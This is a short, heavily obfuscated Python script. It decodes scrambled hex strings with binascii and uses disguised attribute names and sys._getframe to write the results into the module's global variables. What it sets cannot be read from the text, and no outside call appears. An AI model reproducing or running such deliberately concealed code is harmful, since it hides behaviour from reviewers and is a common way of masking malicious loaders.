import sys
import binascii as ba
from functools import reduce
from itertools import tee

d = ['794068d0664f60225bf74417580d4b99h0a0ff61c2c39bb4b7afefc106a4d7efo7e4y6JdO6g4b6G2c5ifO6N2i6J5I6U1z7I2',
     '16N5i7J29h.0e3y7J8Ocgad1W2Q9i6O1N0i5Ic50M4D1g4w2N7mbY6wdM3m1I733N4D0ca42ZbGcI550M3DbB2meMfT0I0zcY7j5',
     'Q03bZemeY7xaNcj2Q032Z8i6I1scI0m153ibZ0i2Ia62M9T8cd0cMcz2U2y7M5z5Qcz8M7i041w6M6T6g1sbIaneNa1eY3i6Id60',
     'Idj5Yc3dZbW7Mfw2Z2T2Y04eY7T0V8O3g0Y8T5E210M1z6Y8xdM7GdR1m7O8N1T4B7icOaN8C7I5s5Ifn2N7j8b93cB4l5cey9I5',
     '69W5y5J7Odg0c4Gal6f3c3mbV3Ofg8Z2C1J1d8L2CdJf26ZeX4J5z1a7W29dudIaj7O4ncx1ffQe.bebE7E7IbS8x2g4Vet1392d',
     '0740jde0J2z0n2-1dfz7n8Obn2xeA4Z7IdHbNcO8nbYff8qeJ4q57641ic3aY1b9P4co7J4M7C6O6N486L2Q5HfI4X1X57064C9G',
     'hNo696f681466ee671e7c217e4a79447f6a5df54d185a0443915df16db2665b7493o6c6f601e6bec6c127f277b4872447b6d',
     '50f46c3f63ca6391685f61e57c4157fd6hbb62557697o7c4c7b246f1b6fb0744457fd48165e0d4f93h09f0711fc2a5fb8efd',
     '6caa86c22a6687e98cdc4b0e1347f48648e05d3a617b406eb0629b755e29410977bcf8dc5o7e4d772c6f1f66bb704c56f876',
     '3768596f3170216c59714ah577a3438d259b23fe9501a2a26bda4f9df113a2e88f83310d8b1d944410fdb6dfdb954ff41ccb',
     'bfo6j6b65c46O9g7v356g5c7t245ffr6e1d7b0j64965Ofg6vby655t7g9h']

for g in reduce('e551f61c'.__class__.__add__, d).split('\157'):
    a = 'ab'
    b = f'f{chr(0o137)}'
    c = getattr(sys._getframe(0), f'{b}glo{a[::-1]}ls')
    h = 97
    e, f = (g[i::2].partition(chr(h ^ 0b1001))[0] for i in range(2))
    g = ''.join(map(chr, (b+(not f-int(str(h)[::-1])) for i, j in (tee(map(ord, e[:1]+f)),) if next(j, None) is not None for f, b in zip(i, j) if (b>>4)^4 or ~b&15)))
    c[getattr(c[a[::-1]], ''.join(c[0]+c[1] for c in zip(a, '2_'))+chr(h^0b1001)+'e'+chr(h^0o31))(e).decode()] = g
